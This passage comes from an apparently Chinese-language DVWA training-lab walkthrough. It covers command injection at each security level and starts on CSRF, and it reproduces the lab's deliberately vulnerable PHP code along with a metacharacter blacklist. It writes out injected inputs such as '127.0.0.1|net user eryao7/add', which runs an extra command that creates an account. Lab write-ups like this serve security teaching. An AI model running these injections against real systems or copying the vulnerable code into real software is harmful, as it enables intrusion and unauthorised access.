information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$last_login</span> );</span><br><span class="line">        <span class="variable">$timeout</span>    = strtotime( <span class="string">&quot;<span class="subst">&#123;$last_login&#125;</span> +<span class="subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );</span><br><span class="line">        <span class="variable">$timenow</span>    = strtotime( <span class="string">&quot;now&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &gt; <span class="variable">$timeout</span> )</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>账户锁定机制，防止爆破</p>
<h1 id="Vulnerability-Command-Injection（命令注入）"><a href="#Vulnerability-Command-Injection（命令注入）" class="headerlink" title="Vulnerability: Command Injection（命令注入）"></a>Vulnerability: Command Injection（命令注入）</h1><p>解决乱码问题：目录下找到dvwaPage.inc.php文件中所有的”charset=utf-8”，修改”charset=gb2312”，即可</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051752.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-low-1"><a href="#Security-level-is-currently-low-1" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码：</p>
<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们尝试输入 127.0.0.1 &amp; ipconfig ,在操作系统中，” &amp; 、&amp;&amp; 、| 、 ||  “都可以作为命令连接符使用,我们在ping完后再执行ipconfig 命令查看ip信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051065.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>执行 127.0.0.1 &amp; net user eryao7/add 尝试ping完后新建一个用户。</p>
<p>哈哈哈哈哈哈哈哈哈，被火绒拦截了。</p>
<p>如果服务器没有装杀毒软件，我们的命令就可以执行了，我们就可以成功创建用户了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; net user eryao7/add</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051516.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-1"><a href="#Security-level-is-currently-medium-1" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<p>将 &amp;&amp; 和 ; 替换成 空格</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
<p>Command 1&amp;&amp;Command 2</p>
<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
<p>Command 1&amp;Command 2</p>
<p>先执行Command 1，不管是否成功，都会执行Command 2</p>
<p> 所以还是与low等级一致</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;ipconfig</span><br><span class="line">127.0.0.1&amp;net user eryao7/add</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-1"><a href="#Security-level-is-currently-high-1" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<p>进一步完善了黑名单，但是我们仔细看的话会发现黑名单中的 | 后面多了一个空格</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/16cab8fdf307478faf5527c71d171793.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|net user eryao7/add</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/2f6c137e6f7c405d8970ab48e85f05a5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-1"><a href="#Security-level-is-currently-impossible-1" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>分析源码：</p>
<p>stripslashes() 函数 删除反斜杠，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
</tbody></table>
<p>explode() 函数 使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p>
<table>
<thead>
<tr>
<th>数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>separator</em></td>
<td>必需。规定在哪里分割字符串。</td>
</tr>
<tr>
<td><em>string</em></td>
<td>必需。要分割的字符串。</td>
</tr>
<tr>
<td><em>limit</em></td>
<td>可选。规定所返回的数组元素的数目。         可能的值：                          大于 0 - 返回包含最多 <em>limit</em> 个元素的数组             小于 0 - 返回包含除了最后的 <em>-limit</em> 个元素以外的所有元素的数组             0 - 会被当做 1, 返回包含一个元素的数组</td>
</tr>
</tbody></table>
<p>is_numeric(string): 该检测string是否为数字或数字字符串</p>
<p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><h1 id="Vulnerability-Cross-Site-Request-Forgery-CSRF-（跨站请求伪造）"><a href="#Vulnerability-Cross-Site-Request-Forgery-CSRF-（跨站请求伪造）" class="headerlink" title="Vulnerability: Cross Site Request Forgery (CSRF)（跨站请求伪造）"></a>Vulnerability: Cross Site Request Forgery (CSRF)（跨站请求伪造）</h1><h2 id="Security-level-is-currently-low-2"><a href="#Security-level-is-currently-low-2" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码：</p>
<p>先判断输入的两个密码是否一致，一致的话直接插入数据库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>修改密码，抓包。发现没有token</p>
